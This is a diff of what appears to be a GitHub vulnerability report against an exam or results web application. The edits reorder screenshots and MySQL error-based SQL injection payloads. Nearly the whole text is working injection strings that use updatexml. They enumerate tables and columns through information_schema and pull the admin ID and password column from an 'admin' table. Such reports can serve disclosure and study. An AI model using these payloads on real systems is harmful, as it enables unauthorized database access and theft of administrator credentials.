@@ -137,13 +137,10 @@ a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables
 
 <img width="1368" height="666" alt="image" src="https://github.com/user-attachments/assets/2400409d-b7f7-45f6-b140-585867510790" />
 
-- Payload table 8:
-a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 7,1),0x7e),1) AND '1'='1
+- burp:
 
 <img width="1496" height="363" alt="image" src="https://github.com/user-attachments/assets/a8bbdbb6-b2fa-4879-b89e-2270c6af61cb" />
 
-
-a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='examans' LIMIT 0,1),0x7e),1) AND '1'='1
 <img width="1491" height="397" alt="image" src="https://github.com/user-attachments/assets/ace6e519-6fcf-45b6-9df6-620ddcff9b97" />
 
 
@@ -162,7 +159,7 @@ a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.colum
 <img width="1404" height="717" alt="image" src="https://github.com/user-attachments/assets/d2a90922-c391-459a-9656-163a933d039e" />
 
 
-- Payload
+
 a' AND updatexml(1,concat(0x7e,(SELECT RsID FROM result LIMIT 0,1),0x7e),1) AND '1'='1
 
 <img width="1348" height="702" alt="image" src="https://github.com/user-attachments/assets/1f9be308-1ad5-4e16-9275-ae51de452bc0" />
@@ -170,24 +167,31 @@ a' AND updatexml(1,concat(0x7e,(SELECT RsID FROM result LIMIT 0,1),0x7e),1) AND 
 
 
 - Payload column to table admin:
+
+  
 a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='admin' LIMIT 0,1),0x7e),1) AND '1'='1
 
 <img width="1401" height="706" alt="image" src="https://github.com/user-attachments/assets/f1933ec8-d2ca-431c-89c5-0eee74193501" />
 
 
 - Payload column to table admin:
+  
+  
 a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='admin' LIMIT 1,1),0x7e),1) AND '1'='1
 
 <img width="1340" height="678" alt="image" src="https://github.com/user-attachments/assets/4377d5fd-6423-4eb6-b9f7-2df88b37430b" />
 
 
 - Payload Aid to admin:
+  
+  
 a' AND updatexml(1,concat(0x7e,(SELECT Aid FROM admin LIMIT 0,1),0x7e),1) AND '1'='1
 
 <img width="1339" height="686" alt="image" src="https://github.com/user-attachments/assets/648b0847-e327-4591-8380-16ff6a381287" />
 
 
 - Payload password to admin:
+  
 
 a' AND updatexml(1,concat(0x7e,(SELECT Apass FROM admin LIMIT 0,1),0x7e),1) AND '1'='1  
 
@@ -196,7 +200,9 @@ a' AND updatexml(1,concat(0x7e,(SELECT Apass FROM admin LIMIT 0,1),0x7e),1) AND 
 
 
 
+a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='examans' LIMIT 0,1),0x7e),1) AND '1'='1
 
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 7,1),0x7e),1) AND '1'='1
 
 a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 8,1),0x7e),1) AND '1'='1
 
